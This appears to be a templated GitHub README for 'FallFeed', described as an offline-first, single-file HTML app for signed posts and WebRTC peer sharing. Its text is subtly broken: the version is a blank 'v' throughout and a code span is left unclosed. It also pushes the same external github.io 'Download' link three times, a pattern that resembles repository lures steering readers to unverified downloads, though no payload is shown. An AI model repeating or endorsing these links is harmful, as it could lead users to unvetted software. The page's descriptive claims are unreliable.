# FallFeed v - browser workflow tool 2026

> **FallFeed is an offline-first browser workflow application for publishing and peer sharing. It runs as a single-file HTML app and includes Ed25519-signed posts, WebRTC mesh connectivity, and PWA-style browser access.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenmooreawrh2879/fallfeed-webrtc-publisher?style=flat-square)](https://github.com/owenmooreawrh2879/fallfeed-webrtc-publisher)

---

<p align="center">
  <a href="https://owenmooreawrh2879.github.io/fallfeed-webrtc-publisher/">
    <img src="https://img.shields.io/badge/Download-FallFeed%20Latest-brightgreen?style=for-the-badge" alt="Download FallFeed">
  </a>
</p>

> **[Download FallFeed v](https://owenmooreawrh2879.github.io/fallfeed-webrtc-publisher/)**

---

[Download Latest Build](https://owenmooreawrh2879.github.io/fallfeed-webrtc-publisher/)

---

## What is FallFeed?

FallFeed provides a browser-native way to publish and exchange content without depending on a conventional server. Local-first storage, cryptographic signing, and peer-to-peer delivery work together so users can create, maintain, share, and export posts directly from a modern browser.

The application is packaged as one HTML file, making it straightforward to host, transfer, or open as a compact web app. It is intended for individuals and teams that need an offline-capable publishing workspace with structured data management and the ability to subscribe to peer updates.

---

## Capabilities

- Protect published post integrity with Ed25519 signatures
- Exchange content over a peer-to-peer WebRTC mesh
- Use offline-first PWA behavior with less reliance on an active connection
- Keep persistent browser-side data in IndexedDB
- Deploy and transport the app as a single HTML file
- Subscribe to updates provided by connected peers
- Export application data in JSON format
- Work through a browser-native interface centered on local control and web standards

---

## Getting Started

Obtain the project by cloning the repository or downloading its files:

- `git clone https://github.com/owenmooreawrh2879/fallfeed-webrtc-publisher.git
- or download and unpack the repository archive

Since FallFeed is delivered as an HTML browser application, the primary HTML file can be opened in a modern browser or hosted through any static file server. For PWA behavior, use the hosted page or run the file through a local static server rather than relying only on direct file opening.

---

## Using FallFeed

1. Launch the application in a compatible browser.
2. Set up or open a workspace stored locally in the browser.
3. Create and manage posts signed with Ed25519.
4. Establish WebRTC mesh connections when content needs to be shared.
5. Subscribe to updates from other connected peers.
6. Export workspace data as JSON whenever a portable copy is needed.

A common workflow is to prepare content locally, exchange it through peer connections, and retain a browser-accessible record that continues to be useful while offline.

---

## Local Configuration

FallFeed manages most configuration within the browser, with local state persisted through IndexedDB. When runtime options are available, they are generally exposed in the application interface or near the HTML file, rather than through a separate backend service.

Example of the kind of local data the app may manage:

    {
      "storage": "IndexedDB",
      "exportFormat": "JSON",
      "sharing": "WebRTC mesh",
      "signing": "Ed25519"
    }

---

## System Requirements

- A modern browser supporting HTML, IndexedDB, and service worker behavior
- Browser support for WebRTC features used by peer mesh sharing
- Sufficient local browser storage for offline content and exported data
- No server installation is needed for the single-file browser workflow

---

## Frequently Asked Questions

**Is an always-running backend required?**  
No. FallFeed uses browser-side storage together with peer-to-peer sharing patterns.

**Will FallFeed work without an internet connection?**  
Yes. Offline-first operation is part of the project design.

**Where does the application keep its data?**  
The browser stores local state in IndexedDB.

**How can I take content out of FallFeed?**  
Use the JSON export feature to generate a portable data file.

**What can I check when peer sharing fails?**  
Verify browser compatibility, permissions, and the network conditions required for WebRTC. When running locally, serve the application through a static web server instead of opening the HTML file directly.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
